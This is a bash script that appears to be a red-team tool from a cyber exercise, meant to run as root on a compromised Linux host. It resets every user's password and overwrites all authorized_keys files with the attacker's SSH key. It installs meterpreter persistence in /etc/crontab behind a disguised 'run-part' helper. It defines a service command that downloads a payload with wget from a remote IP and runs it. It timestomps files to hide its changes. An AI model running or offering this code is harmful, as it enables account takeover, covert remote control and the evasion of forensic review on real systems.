#!/usr/bin/env bash

# Root check
if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi


# *** Helper Functions ***

# Colors
COLOR_OFF='\033[0m'
BOLD_WHITE='\033[1;37m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
GREEN='\033[0;32m'

#######################################
# Log colored and status-prefixed text to the terminal depending on the
# user-provided log type.
#
# Globals:
#   All above colors
# Arguments:
#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
#   Log message, the message to be printed to the terminal
# Outputs:
#   Colored and status-prefixed text otherwise, or usage on error
# Returns:
#   0 if cecho usage was correct, 1 otherwise
########################################
cecho() {
	local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|sep|done> <\"log_message\">${COLOR_OFF}"

	if [ $# -ne 2 ]; then
		echo -e "$cecho_usage"
		return 1
	fi

	local log_type=$1
	local log_message=$2

	case $log_type in
		"task")
			echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
			;;
		"error")
			echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
			;;
		"warning")
			echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
			;;
		"info")
			echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
			;;
		"log")
			echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
			;;
		"debug")
			echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
			;;
		"sep")
			echo -en "${YELLOW}"
			for _ in {1..10}; do echo -n "${log_message}"; done
			echo -e "${COLOR_OFF}"
			;;
		"done")
			echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
			echo
			;;
		*)
			echo -e "$cecho_usage"
			return 1
			;;
	esac
}


#######################################
# Get a file's timestamp in YYYYMMDDhhmm format for use with "time -t".
#
# Globals:
#   None
# Arguments:
#   The file path to retrieve the timestamp from
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if stat obtained file's timestamp, 1 otherwise
########################################
get_timestamp() {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" \
		| grep "Modify" \
		| cut -d " " -f 2,3 \
		| cut -d ":" -f 1,2 \
		| tr -d "-" \
		| tr -d ":" \
		| tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}


#######################################
# Set a file's timestamp (perform a "timestomp").
#
# Globals:
#   None
# Arguments:
#   The file path to set the timestamp on
# Outputs:
#   Status or usage on error, otherwise nothing
# Returns:
#   0 if file's timestamp was set, 1 otherwise
########################################
set_timestamp() {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}


#######################################
# Check if the given command exists and is executable.
#
# Globals:
#   None
# Arguments:
#   The binary/command to search the existence of
# Outputs:
#   Usage information on improper usage, otherwise none
# Returns:
#   0 if the binary/command exists, 1 otherwise
########################################
exists() {
	if [ $# -ne 1 ]; then
		cecho error "exists usage: exists <binary/command/executable>"
		return 1
	fi
	
	local search="$1"

	test -x "$(command -v "$search")" &>/dev/null
}


# *** Configurable variables ***

PAM_DIR="/etc/pam.d"
SSHD_PAM="$PAM_DIR/sshd"

IP="172.19.16.5"
REVERSE_PORT="80"

SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbK1Mt/L1RSbEwgwF28D5Z5OYc9eB09a7vCPDf8uu4FAozjb9zc9VO32s8wZmUpjSJYBNlAhe0pCYD9sVOqPQc8Wq+Lq2598D+R4KAnKblKHAwBKfFpwFcnu8Y8u3RAeQTnFfY/Hk6TeH8fv03qRlakATcxGaqj6AKrARERzrXgktK9vf+/v6RcAWKjg+dgojtGXjy76qrYGzS+FteLAjNS4TsG7gn9Uf0jm+So/kM7MikDFuIYaKsSQq94C+6QlEAee7mxbFZQ+Zms6k6ZPa01CVJNoEvg7fQTABgRCWLht8KVRDURWrnp/pw+WP995cX3u7iciQMwA3x1HBvlxg7nGIpRI4Fdsx+Lo8Nn5D0XtuHOhebqhYYf0fMfjyI/7c2zbEw8qBM9liQ5kzXWHB2zhfmrxgPlzhC7TSbfEjFW1npfCaA8ov/zc8O0XhkHj+gnC3WI9rL87sbBna/lJQutrK+n6u1UqdyK8ND3l+mJP/zrOdrjRGqT9kFJWG8F58= moleary@exercisecontrol"

GLOBAL_PROFILE_DIR="/etc/profile.d"
PROFILE_FILE="bash_completion.sh"

# Crontab meterpreter
METERPRETER_BASE_DIR="."
METERPRETER="$METERPRETER_BASE_DIR/lrev80"
NEW_METERPRETER="dnsmasq"
NEW_METERPRETER_PATH="/sbin/$NEW_METERPRETER"
CRONTAB="/etc/crontab"
CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-part --report \/etc\/cron\.hourly"
CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
RUNPART_PATH="/usr/bin/run-part"
RUNPART_SCRIPT="#!/usr/bin/env bash

which \"bakps\" &>/dev/null && (! grep -q \"$NEW_METERPRETER\" <<< \"\$(bakps aux)\" && $NEW_METERPRETER_PATH &) || (! grep -q \"$NEW_METERPRETER\" <<< \"\$(ps aux)\" && $NEW_METERPRETER_PATH &)"

# Web delivery meterpreter
WEB_URI="systemd-clock"
WEB_PORT="8080"

# Services
SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
SERVICE_NAME="systemd-clock"
SERVICE_DESCRIPTION="Clock Service Daemon"
#SERVICE_COMMAND="/usr/bin/test -f $SERVICE_PAYLOAD_PATH || $(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; $(which chmod) +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
SERVICE_COMMAND="$(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI && $(which chmod) +x $SERVICE_PAYLOAD_PATH && $SERVICE_PAYLOAD_PATH && exit 0"

# systemd
SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
SYSTEMD_SERVICE="[Unit]
Description=$SERVICE_DESCRIPTION

[Service]
Type=simple
ExecStart=$SERVICE_COMMAND
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"

# SysVInit
INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
INIT_PID_PATH="/var/run/csd.pid"
INIT_SERVICE="description \"$SERVICE_DESCRIPTION\"
start on filesystem or runlevel 2345
stop on shutdown
respawn
respawn limit 10 5
script
    echo \$\$ > $INIT_PID_PATH
    $SERVICE_COMMAND
end script"



# *** Main ***

change_passwords() {
	cecho task "Changing passwords for all users"

	if ! exists "chpasswd"; then
		cecho error "chpasswd not found, skipping"
		return
	fi

	read -p "New password to change to: " NEW_PASS

	local backup_files="passwd- shadow- subuid- subgid- gshadow- group-"
	local users="$(egrep -i "bash|zsh|ksh" /etc/passwd | egrep -v "postgres" | cut -d: -f1)"

	etc_timestamp=`get_timestamp "/etc"`
	passwd_timestamp=`get_timestamp "/etc/passwd"`
	shadow_timestamp=`get_timestamp "/etc/shadow"`

	for user in ${users}; do
		echo "${user}:${NEW_PASS}" | chpasswd \
			&& cecho info "Changed password for ${user}" \
			|| cecho error "Couldn't change password for ${user}"
	done

	for file in ${backup_files}; do
		if [ -f "/etc/${file}" ]; then
			rm "/etc/${file}" \
				&& cecho info "Removed /etc/${file}" \
				|| cecho error "Couldn't remove /etc/${file}"
		fi
	done

	set_timestamp $etc_timestamp "/etc"
	set_timestamp $passwd_timestamp "/etc/passwd"
	set_timestamp $shadow_timestamp "/etc/shadow"

	cecho done "Changed all users' passwords to '${NEW_PASS}'"
}

change_passwords



cecho task "Removing all other SSH keys and adding my own to all users' authorized_keys files"

# Don't forget to include /root/.ssh/authorized_keys
for home_dir in /root /home/*; do

	# Ensure we're working on a directory, not a random file in /home/
	if [ -d "$home_dir" ]; then

		home_timestamp=$(get_timestamp "$home_dir")

		# Create user's ~/.ssh directory if necessary, and retrieve appropriate timestamps
		if [ -d "$home_dir/.ssh" ]; then
			ssh_timestamp=$(get_timestamp "$home_dir/.ssh")
			cecho log "'$home_dir/.ssh' already exists"
		else
			ssh_timestamp=$(get_timestamp "$home_dir")
			cecho info "Creating '$home_dir/.ssh'"
			mkdir -p "$home_dir/.ssh"
		fi

		# Retrieve appropriate timestamps for authorized_keys files
		if [ -f "$home_dir/.ssh/authorized_keys" ]; then
			keys_timestamp=$(get_timestamp "$home_dir/.ssh/authorized_keys")
			cecho log "'$home_dir/.ssh/authorized_keys' already exists"
		else
			keys_timestamp=$ssh_timestamp
			cecho info "Will create '$home_dir/.ssh/authorized_keys'"
		fi

		# Add the key
		echo "$SSH_KEY" > "$home_dir/.ssh/authorized_keys" \
			&& cecho info "Refreshed '$home_dir/.ssh/authorized_keys'" \
			|| cecho error "Could not write to '$home_dir/.ssh/authorized_keys'"

		# Timestomp
		set_timestamp $home_timestamp "$home_dir"
		set_timestamp $ssh_timestamp "$home_dir/.ssh"
		set_timestamp $keys_timestamp "$home_dir/.ssh/authorized_keys"

	else
		cecho warning "Skipping non-directory '$home_dir'"
	fi

done

cecho done "Done adding SSH key to authorized_keys files"



fix_pam() {
	cecho task "Removing my SSH PAM backdoor"

	if [ ! -f "$SSHD_PAM" ]; then
		cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
		return
	fi

	if ! grep -q "pam_permit.so" "$SSHD_PAM"; then
		cecho log "SSH PAM backdoor not present"
		return
	fi

	pam_timestamp=$(get_timestamp "$PAM_DIR")
	sshd_pam_timestamp=$(get_timestamp "$SSHD_PAM")

	sed -i 's/auth       sufficient     pam_permit.so\n//g' $SSHD_PAM \
		&& cecho info "SSH PAM authentication bypass removed" \
		|| cecho error "Couldn't modify '$SSHD_PAM'"

	set_timestamp $pam_timestamp $PAM_DIR
	set_timestamp $sshd_pam_timestamp $SSHD_PAM

	cecho done "Done removing SSH PAM backdoor"
}

fix_pam



fix_bash() {
	cecho task "Removing my bind shell from bash startup"

	if [ ! -f "${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}" ]; then
		cecho error "Global profile file '${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}' does not exist, skipping"
		return
	fi

	profile_dir_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR")
	profile_file_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE")

	if [ ! -f "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" ]; then
		cecho info "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' does not exist"
		profile_file_timestamp=$profile_dir_timestamp
	else
		cecho log "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' already exists"
		profile_file_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE")
	fi

	if ! grep -q "setsid" "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"; then
		cecho log "Bind shell backdoor not present, skipping"
		return
	fi

	grep -v "setsid" "${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}" > "${GLOBAL_PROFILE_DIR}/tmp"
	mv "${GLOBAL_PROFILE_DIR}/tmp" "${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}" \
		&& cecho info "Removed setsid line from ${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}" \
		|| cecho error "Couldn't remove setsid line from ${GLOBAL_PROFILE_DIR}/${PROFILE_FILE}"

	set_timestamp $profile_dir_timestamp "$GLOBAL_PROFILE_DIR"
	set_timestamp $profile_file_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"

	cecho debug "Remember to stop any currently-running bind shell processes!"
	cecho done "Done removing netcat bind shell"
}

fix_bash



list_crontabs() {
	cecho task "Listing all crontabs"

	for tab in /etc/crontab /var/spool/cron/crontabs/*; do
		if [ -f "${tab}" ]; then
			cecho log "${tab}"
			cat "${tab}"
			echo
		else
			cecho error "Crontab '${tab}' is not a file"
		fi
	done

	cecho debug "Also check out /etc/cron.d, /etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, and /etc/cron.monthly"
	cecho done "Done listing all crontabs"
}

list_crontabs



persistence_crontab() {
	cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"

	if [ ! -f "$CRONTAB" ]; then
		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
		return
	fi

	if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
		cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
		return
	fi

	if ! cp -f "$METERPRETER" "$NEW_METERPRETER_PATH" 2>/dev/null && chmod a+x "$NEW_METERPRETER_PATH"; then
		cecho error "Could not copy meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER_PATH', skipping"
		return
	fi

	cecho info "Copied meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER_PATH'"

	if exists "run-parts"; then
		run_parts_timestamp=$(get_timestamp "/usr/bin/run-parts")
	else
		run_parts_timestamp=202009271325.47
	fi

	usr_bin_timestamp=$(get_timestamp "/usr/bin") 
	bin_timestamp=$(get_timestamp "/bin")
	new_meterpreter_timestamp=$run_parts_timestamp
	etc_timestamp=$(get_timestamp "/etc")
	crontab_timestamp=$(get_timestamp "$CRONTAB")

	if ! echo "$RUNPART_SCRIPT" > "$RUNPART_PATH"; then
		cecho error "Couldn't write to '$RUNPART_PATH'"
		return
	fi

	if ! chmod a+x "$RUNPART_PATH"; then
		cecho error "Couldn't 'chmod a+x $RUNPART_PATH'"
		set_timestamp $run_parts_timestamp "$RUNPART_PATH"
		return
	fi

	cecho info "Wrote helper run-part script to '$RUNPART_PATH'"

	# The whole purpose of this is to change the callback frequency to every minute, not
	# whatever its default is which I believe is on the 17th minute of every hour.
	if grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
		sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
	elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
		first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
		prepended="$CRONTAB_REPLACE\n$first_task"
		sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
	else # nothing exists in crontab
		echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
	fi

	set_timestamp $usr_bin_timestamp "/usr/bin"
	set_timestamp $bin_timestamp "/bin"
	set_timestamp $run_parts_timestamp "$RUNPART_PATH"
	set_timestamp $new_meterpreter_timestamp "$NEW_METERPRETER_PATH"
	set_timestamp $etc_timestamp "/etc"
	set_timestamp $crontab_timestamp "$CRONTAB"

	cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"
}

persistence_crontab



search_for_persistence() {
	cecho task "Searching for persistence in shell config files"

	for conf in /etc/bash.bashrc /etc/profile /etc/profile.d/*; do
		cecho log "Searching ${conf}"
		grep --color=always 172 "${conf}" && cecho warning "Found persistence in ${conf}"
	done;
	
	for home in /home/* /root; do
		echo "Searching ${home}"
		grep --color=always 172 "${home}/.bashrc" && cecho warning "Found persistence in ${home}"
		grep --color=always 172 "${home}/.profile" && cecho warning "Found persistence in ${home}"
	done

	cecho done "Done searching for shell persistence"
}

search_for_persistence



echo
cecho done "--- SYSTEM LOCKED DOWN ---"
cecho debug "Don't forget to delete me!"
